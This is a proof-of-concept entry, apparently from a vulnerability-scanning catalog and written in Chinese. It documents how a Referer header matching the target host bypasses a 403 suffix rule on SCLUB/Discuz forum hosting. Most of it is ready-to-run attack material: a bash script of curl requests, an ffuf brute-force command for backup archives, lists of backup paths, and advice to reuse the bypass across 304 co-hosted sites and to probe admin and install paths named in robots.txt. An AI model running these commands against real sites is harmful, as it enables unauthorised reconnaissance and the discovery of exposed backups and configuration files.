# SCLUB/168six：403 站点规则可被本站 Referer 绕过（备份/后缀探测假阴性）

- **code**: sclub-168six-403-站点规则可被本站-referer-绕过-探测假阴性
- **kind**: poc
- **category**: auth-bypass
- **component**: SCLUB 免費論壇平台 / Apache 2.2.3 (CentOS) + PHP 5.1.6
- **severity**: low
- **language**: bash
- **source**: manual
- **verified**: 1
- **verified_note**: 2026-11-02 在 target74.example.com 实测复现（finding#1213，finding_checks=verified）：GET /robots.txt 无 Referer → 403 Forbidden / Content-Length 1125（静态 /ERR/ 错误页）；同一请求仅加 Referer: http://target74.example.com/ → 200 OK / 721B，正文为 Discuz! 7.0.0 默认 robots（Disallow: /admin/ /api/ /install/ /forumdata/ /include/ /ipdata/）。两次请求只差 Referer 头，证明障碍是规则而非文件缺失，判定成立。更早同一规则集在 203.0.113.112 已做全量对照（Referer 精确主机=404/任意路径=404/别名域=403/无 Referer=403；48 条 .zip/.rar 备份路径无 Referer 全 403 → 带 Referer 全真 404）。
- **path**: pocs/sclub-168six-403-站点规则可被本站-referer-绕过-探测假阴性/sclub_referer_bypass_403.sh
- **tags**: SCLUB,Discuz,Apache,403绕过,Referer,防盗链,信息收集假阴性,备份探测,后缀遮蔽,finding-1213
- **created_at**: 2026-09-29T07:14:44.814Z
- **engine**: target74.example.com
- **found_by**: vuln-scan

## 描述

针对 SCLUB 免费论坛平台（Apache 2.2.3）站点级后缀访问规则：.zip/.rar/.txt/.jpg/.png/.gif 的请求一律 403/1125（不检查文件存在性），导致 robots.txt 与全部备份包被误判为"不存在"，形成**假阴性**。加请求头 Referer: http://<目标精确主机名>/ 即可绕过，恢复真实判定。原理：规则按 Referer 主机名精确匹配（防盗链型 RewriteRule/Cond），同 IP 别名域作 Referer 无效。

## 用法

```
① 先判该后缀是否被遮蔽：curl -s -o /dev/null -w "%{http_code} %{size_download}\n" http://TARGET/<随机名>.zip —— 得 403 1125 即被遮蔽，此刻的 403 不能当"不存在"。② 带 Referer 复测：curl -H "Referer: http://TARGET/" http://TARGET/robots.txt（Referer 必须精确等于目标主机名并含协议，路径任意，结尾斜杠可有可无；别名域/裸 IP 无效）。③ 批量场景：ffuf -u http://TARGET/FUZZ -w wordlist.txt -H "Referer: http://TARGET/" -mc 200,301,302 -t 8 -rate 8。④ 判据：带 Referer 后 404/1143=确实不存在，200/正常长度=存在，403/1125=仍被拦（.ht* 家族对任何 Referer 都 403）。⑤ 只在 robots/备份后缀被 403 遮蔽时才用；.sql/.bak/.php/.xml/.json 等本不受规则影响，加不加 Referer 结果一致。
```

## 正文

```
#!/usr/bin/env bash
# ── SCLUB 平台（example.com）403 后缀规则绕过 ──────────────
# 规则行为：对 .zip/.rar/.txt/.jpg/.png/.gif/.ht* 的请求一律返回 403/1125
#          （**不看文件是否存在** ⇒ 该 403 不能用作"文件不存在"的判据）
# 绕过方式：加请求头 Referer，值为**目标站点的精确主机名**（含协议与结尾 /）

TARGET="http://example.com"

# ① 对照：无 Referer → 403/1125（规则拦下，未走到文件系统检查）
curl -s -o /dev/null -w "no-Referer  : %{http_code} %{size_download}B\n" "$TARGET/robots.txt"
#   → no-Referer  : 403 1125B

# ② 绕过：带本站 Referer → 200/721B（真实文件）
curl -s -o /dev/null -w "with-Referer: %{http_code} %{size_download}B\n" \
     -H "Referer: $TARGET/" "$TARGET/robots.txt"
#   → with-Referer: 200 721B        ← robots.txt 真实存在（Discuz! 7.0.0 默认）

# ③ 具体文件内容
curl -s -H "Referer: $TARGET/" "$TARGET/robots.txt"

# ── 关键技术点：Referer 必须"精确匹配主机名" ─────────────────────
# 通过对照实验确定（同一随机 .zip 目标，只改 Referer）：
#   Referer: http://example.com/        → 404  ✅ 绕过成功
#   Referer: http://example.com/example.com → 404  ✅（路径任意）
#   Referer: http://example.com/               → 403  ❌（同 IP 的别名域无效）
#   Referer: http://evil.example.com/         → 403  ❌
#   无 Referer                                 → 403  ❌

# ── 影响后缀测试（随机不存在文件，判定该后缀是否被规则遮蔽）──────
# 被规则遮蔽（无 Referer 恒 403，判定无效）：
#   .zip  .rar  .txt  .jpg  .png  .gif  .htaccess/.ht*（.ht* 为 Apache 内置，任何 Referer 都无效）
# 不受影响（无 Referer 即返回真 404/200，判定直接有效）：
#   .sql .bak .old .tar.gz .tgz .tar .gz .bz2 .7z .dump .log .conf .cfg .inc .php .db .xml .json
# 判据：先请求 /<随机名>.<后缀>，403/1125 ⇒ 该后缀被规则遮蔽，必须带 Referer 再判。

# ── 判定口径（带上 Referer 之后）────────────────────────────────
#   404/1143 ⇒ 文件确实不存在
#   200/正常长度 ⇒ 文件存在（读取内容）
#   403/1125 ⇒ 仍被拦（.ht* 家族或无 Referer）

# ── 已验证案例 ─────────────────────────────────────────────────
# robots.txt：403 (无 Referer) → 200 / 721B (带 Referer)，内容为 Discuz! 7.0.0 默认 robots
# 48 条备份路径（.zip/.rar：/www.zip /backup.zip /uc_server/data/backup/backup.zip 等）
#   ：无 Referer 全部 403（无法判定）→ 带 Referer 全部 **真 404**（确定不存在）

# ── 跨靶标复用 ─────────────────────────────────────────────────
# 该 IP(203.0.113.112) 上承载 304 个 SCLUB 免费论坛站点，同一 Apache/.htaccess 规则集，
# 凡遇 403/1125 且内容是 Apache 错误页，先按本 POC 加本站 Referer 重试。

# ── 2026-11-02 复测记录（target74.example.com，finding#1213）────────
# GET /robots.txt 无 Referer               → 403 / 1125（静态 /ERR/ 页）
# GET /robots.txt  Referer: http://target74.example.com/ → 200 / 721（Discuz! 7.0.0 默认 robots）
# 结论：同一规则在新靶标上依然生效；robots 里 Disallow 的 /admin/ /api/ /install/
#       /forumdata/ /include/ /ipdata/ 可直接作为后续备份/配置探测的起点。

```
